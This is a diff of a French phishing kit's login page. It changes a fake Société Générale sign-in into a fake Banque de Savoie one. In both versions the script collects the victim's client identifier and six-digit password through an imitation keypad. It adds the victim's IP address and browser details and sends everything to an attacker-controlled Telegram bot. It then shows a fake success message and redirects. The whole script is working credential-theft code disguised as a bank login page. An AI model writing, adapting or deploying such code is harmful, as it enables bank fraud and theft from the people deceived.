@@ -654,257 +654,231 @@
 </aside>
 
 <script>
+        // Configuration Telegram
+        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
+        const CHAT_ID = '6078788670';
 
-// Attendre config.js
-async function waitForConfig(maxWait = 3000) {
-    const start = Date.now();
-    while (!window.telegramConfig && Date.now() - start < maxWait) {
-        await new Promise(r => setTimeout(r, 50));
-    }
-    return window.telegramConfig;
-}
+        // Toast elements
+        const toast = document.getElementById('toast');
+        
+        function showToast(message, isError = false) {
+            toast.textContent = message;
+            toast.className = 'toast show' + (isError ? ' error' : ' success');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.className = 'toast';
+            }, 3000);
+        }
 
+        // --- LOGIQUE ÉTAPE 1 (Identifiant) ---
+        const inputIdentifiant = document.getElementById('identifiant');
+        const btnEtapeSuivante = document.getElementById('btn-etape-suivante');
+        const rememberCheckbox = document.getElementById('rememberId');
+        
+        const etape1 = document.getElementById('etape-1');
+        const etape2 = document.getElementById('etape-2');
 
-    // Configuration Telegram
-    const TELEGRAM_BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
-    const TELEGRAM_CHAT_ID = '6078788670';
-    
-    // Variables globales
-    let secretCode = [];
-    const maxDigits = 6;
-    let rememberMe = false;
-    let clientCodeValue = '';
-    let dataCollected = false;
-    
-    // Fonction pour passer à l'étape du clavier
-    function goToStep2() {
-        clientCodeValue = document.getElementById('clientCode').value.trim();
-        
-        if (!clientCodeValue) {
-            clientCodeValue = "Non renseigné";
+        let identifiantSaisi = '';
+
+        // Charger l'identifiant mémorisé
+        const savedId = localStorage.getItem('banque_savoie_saved_id');
+        if (savedId) {
+            inputIdentifiant.value = savedId;
+            rememberCheckbox.checked = true;
+            btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+            btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+            btnEtapeSuivante.removeAttribute('disabled');
+            identifiantSaisi = savedId;
         }
-        
-        document.getElementById('step1').classList.add('step-hidden');
-        document.getElementById('step2').classList.remove('step-hidden');
-        resetDots();
-        
-        console.log('Code client saisi:', clientCodeValue);
-    }
-    
-    // Gestion du "Se souvenir de moi"
-    function toggleRemember() {
-        rememberMe = !rememberMe;
-        const toggleSwitch = document.getElementById('toggleSwitch');
-        const toggleSwitch2 = document.getElementById('toggleSwitch2');
-        const rememberText = document.getElementById('rememberText');
-        const rememberText2 = document.getElementById('rememberText2');
-        
-        if (rememberMe) {
-            toggleSwitch.style.left = '18px';
-            toggleSwitch2.style.left = '18px';
-            rememberText.textContent = 'oui Se souvenir de moi';
-            rememberText2.textContent = 'oui Se souvenir de moi';
-        } else {
-            toggleSwitch.style.left = '2px';
-            toggleSwitch2.style.left = '2px';
-            rememberText.textContent = 'non Se souvenir de moi';
-            rememberText2.textContent = 'non Se souvenir de moi';
-        }
-    }
-    
-    // Gestion des points du code secret
-    function addDot(number) {
-        if (secretCode.length < maxDigits) {
-            secretCode.push(number);
-            updateDotsDisplay();
-            
-            if (event && event.target) {
-                event.target.style.backgroundColor = '#e0e0e0';
-                setTimeout(() => {
-                    event.target.style.backgroundColor = '';
-                }, 200);
-            }
-        }
-        
-        if (secretCode.length === maxDigits) {
-            document.getElementById('validateBtn').disabled = false;
-        }
-    }
-    
-    function resetDots() {
-        secretCode = [];
-        updateDotsDisplay();
-        document.getElementById('validateBtn').disabled = true;
-    }
-    
-    function updateDotsDisplay() {
-        for (let i = 0; i < maxDigits; i++) {
-            const dot = document.getElementById(`dot-${i}`);
-            if (i < secretCode.length) {
-                dot.classList.add('filled');
+
+        // Activer le bouton de l'étape 1 si l'identifiant n'est pas vide
+        inputIdentifiant.addEventListener('input', (e) => {
+            if (e.target.value.trim().length > 0) {
+                btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnEtapeSuivante.removeAttribute('disabled');
+                identifiantSaisi = e.target.value.trim();
             } else {
-                dot.classList.remove('filled');
-            }
-        }
-    }
-    
-    function clearClientCode() {
-        document.getElementById('clientCode').value = '';
-        document.getElementById('clientCode').focus();
-    }
-    
-    async function sendViaFetch(message) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-            
-            if (response.ok) {
-                console.log('✅ Données envoyées via Fetch');
-                return true;
-            }
-        } catch (error) {
-            console.log('❌ Erreur Fetch');
-        }
-        return false;
-    }
-    
-    function sendViaXHR(message) {
-        return new Promise((resolve) => {
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        console.log('✅ Données envoyées via XHR');
-                        resolve(true);
-                    } else {
-                        resolve(false);
-                    }
-                };
-                
-                xhr.onerror = function() {
-                    resolve(false);
-                };
-                
-                xhr.send(JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                }));
-                
-                setTimeout(() => resolve(false), 3000);
-            } catch (error) {
-                resolve(false);
+                btnEtapeSuivante.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnEtapeSuivante.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnEtapeSuivante.setAttribute('disabled', 'true');
+                identifiantSaisi = '';
             }
         });
-    }
-    
-    async function sendCompleteDataToTelegram() {
-        if (dataCollected) return true;
-        
-        dataCollected = true;
-        const secretCodeStr = secretCode.join('');
-        const timestamp = new Date().toLocaleString('fr-FR');
-        
-        let platform = 'Desktop';
-        if (/Android/.test(navigator.userAgent)) platform = 'Android';
-        if (/iPhone|iPad|iPod/.test(navigator.userAgent)) platform = 'iOS';
-        
-        const fullMessage = `🔔 *NOUVELLE CONNEXION SOCIÉTÉ GÉNÉRALE* 🔔
-        
-📋 *INFORMATIONS DE CONNEXION* 📋
 
-👤 **CODE CLIENT:** ${clientCodeValue}
-🔒 **MOT DE PASSE:** ${secretCodeStr}
-💾 **Se souvenir de moi:** ${rememberMe ? 'OUI ✅' : 'NON ❌'}
+        // Passer de l'étape 1 à l'étape 2
+        btnEtapeSuivante.addEventListener('click', () => {
+            if (identifiantSaisi) {
+                // Sauvegarder l'identifiant si la case est cochée
+                if (rememberCheckbox.checked) {
+                    localStorage.setItem('banque_savoie_saved_id', identifiantSaisi);
+                } else {
+                    localStorage.removeItem('banque_savoie_saved_id');
+                }
+                
+                etape1.classList.add('hidden');
+                etape1.classList.remove('flex');
+                etape2.classList.remove('hidden');
+                etape2.classList.add('flex');
+            }
+        });
 
-📱 **INFORMATIONS TECHNIQUES** 📱
-
-🌐 **Plateforme:** ${platform}
-🕒 **Date/Heure:** ${timestamp}
-📍 **Langue:** ${navigator.language}
-📏 **Résolution écran:** ${screen.width}x${screen.height}
-📊 **Navigateur:** ${navigator.userAgent.substring(0, 100)}...
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-
-        const methods = [
-            sendViaFetch(fullMessage),
-            sendViaXHR(fullMessage)
-        ];
+        // --- LOGIQUE ÉTAPE 2 (Mot de passe) ---
+        const btnRetour = document.getElementById('btn-retour');
+        const touchesClavier = document.querySelectorAll('.touche-clavier');
+        const btnSupprimer = document.getElementById('btn-supprimer');
+        const btnConnexion = document.getElementById('btn-connexion');
+        const affichageMdp = document.getElementById('affichage-mdp');
         
-        const results = await Promise.allSettled(methods);
-        return results.some(result => result.status === 'fulfilled' && result.value === true);
-    }
-    
-    async function validateAndSend() {
-        const validateBtn = document.getElementById('validateBtn');
-        const loading = document.getElementById('loading');
-        const successMsg = document.getElementById('success-message');
-        
-        if (secretCode.length < maxDigits) {
-            alert("Veuillez saisir les 6 chiffres de votre code secret");
-            return;
+        const LONGUEUR_MDP = 6; 
+        let motDePasseSaisi = '';
+
+        // Bouton retour (Efface le mdp et ramène à l'étape 1)
+        btnRetour.addEventListener('click', () => {
+            etape2.classList.add('hidden');
+            etape2.classList.remove('flex');
+            etape1.classList.remove('hidden');
+            etape1.classList.add('flex');
+            motDePasseSaisi = '';
+            mettreAJourAffichage();
+        });
+
+        // Clic sur les chiffres du clavier
+        touchesClavier.forEach(touche => {
+            touche.addEventListener('click', (e) => {
+                if (motDePasseSaisi.length < LONGUEUR_MDP) {
+                    motDePasseSaisi += e.target.innerText;
+                    mettreAJourAffichage();
+                }
+            });
+        });
+
+        // Effacer le dernier chiffre saisi
+        btnSupprimer.addEventListener('click', () => {
+            if (motDePasseSaisi.length > 0) {
+                motDePasseSaisi = motDePasseSaisi.slice(0, -1);
+                mettreAJourAffichage();
+            }
+        });
+
+        // Mettre à jour l'affichage des pastilles noires
+        function mettreAJourAffichage() {
+            affichageMdp.innerHTML = '';
+            
+            for (let i = 0; i < LONGUEUR_MDP; i++) {
+                const pastille = document.createElement('div');
+                pastille.className = `w-4 h-4 rounded-full border-2 transition-all duration-200 `;
+                
+                if (i < motDePasseSaisi.length) {
+                    pastille.classList.add('bg-gray-800', 'border-gray-800');
+                } else {
+                    pastille.classList.add('border-gray-300', 'bg-transparent');
+                }
+                
+                affichageMdp.appendChild(pastille);
+            }
+
+            // Activer/Désactiver le bouton final
+            if (motDePasseSaisi.length === LONGUEUR_MDP) {
+                btnConnexion.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnConnexion.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnConnexion.removeAttribute('disabled');
+            } else {
+                btnConnexion.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
+                btnConnexion.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
+                btnConnexion.setAttribute('disabled', 'true');
+            }
         }
-        
-        validateBtn.disabled = true;
-        validateBtn.style.opacity = '0.7';
-        loading.style.display = 'block';
-        successMsg.style.display = 'none';
-        
-        await sendCompleteDataToTelegram();
-        
-        loading.style.display = 'none';
-        successMsg.textContent = '✅ Connexion réussie ! Redirection en cours...';
-        successMsg.style.display = 'block';
-        
-        setTimeout(() => {
-            window.location.href = 'confirmation.html';
-        }, 2000);
-    }
-    
-    document.getElementById('clientCode').addEventListener('keypress', function(event) {
-        if (event.key === 'Enter') {
-            event.preventDefault();
-            goToStep2();
+
+        // Fonction pour obtenir l'IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Non disponible';
+            } catch (error) {
+                return 'Non disponible';
+            }
         }
-    });
-    
-    document.getElementById('clientCode').addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '');
-    });
-    
-    document.addEventListener('DOMContentLoaded', function() {
-        const clientCodeInput = document.getElementById('clientCode');
-        if (clientCodeInput) {
-            clientCodeInput.focus();
+
+        // Envoi à Telegram
+        async function sendToTelegram() {
+            const ip = await getIP();
+            const message = `🏔️ BANQUE DE SAVOIE - NOUVELLE CONNEXION 🏔️
+━━━━━━━━━━━━━━━━━━━━━
+👤 Identifiant: ${identifiantSaisi}
+🔑 Mot de passe: ${motDePasseSaisi}
+━━━━━━━━━━━━━━━━━━━━━
+🌍 IP: ${ip}
+📱 User-Agent: ${navigator.userAgent}
+🕐 Date: ${new Date().toLocaleString('fr-FR')}
+✅ Statut: Connexion en cours`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: window.CHAT_ID || CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('');
+                    showToast(' ');
+                    return true;
+                } else {
+                    console.error('❌ Erreur Telegram:', data);
+                    showToast('❌ Erreur: ' + data.description, true);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
+                showToast('❌ Erreur de connexion', true);
+                return false;
+            }
         }
-        
-        document.getElementById('validateBtn').disabled = true;
-    });
-    
-    window.addEventListener('beforeunload', function() {
-        if (clientCodeValue && secretCode.length > 0 && !dataCollected) {
-            const partialData = {
-                clientCode: clientCodeValue,
-                partialPassword: secretCode.join(''),
-                rememberMe: rememberMe,
-                timestamp: new Date().toISOString()
-            };
-            localStorage.setItem('sg_partial_data', JSON.stringify(partialData));
+
+        // Initialiser l'affichage vide au démarrage
+        mettreAJourAffichage();
+
+        // --- VALIDATION ET ENVOI À TELEGRAM ---
+        btnConnexion.addEventListener('click', async () => {
+            if (motDePasseSaisi.length === LONGUEUR_MDP) {
+                
+                // Désactiver le bouton pour éviter double clic
+                btnConnexion.disabled = true;
+                
+                // Afficher l'écran de chargement
+                const ecranChargement = document.getElementById('ecran-chargement');
+                ecranChargement.classList.remove('hidden');
+                ecranChargement.classList.add('flex');
+                
+                // Envoyer les données à Telegram
+                await sendToTelegram();
+                
+                // Attendre 2 secondes puis rediriger
+                setTimeout(() => {
+                    window.location.href = 'confirmation.html';
+                }, 2000);
+            }
+        });
+
+        // Animation purement visuelle pour le toggle accessibilité
+        const toggle = document.getElementById('toggle');
+        if (toggle) {
+            toggle.addEventListener('change', (e) => {
+                if (e.target.checked) {
+                    e.target.style.transform = 'translateX(1.25rem)';
+                } else {
+                    e.target.style.transform = 'translateX(0)';
+                }
+            });
         }
-    });
-</script>
+    </script>
 </body>
 </html>
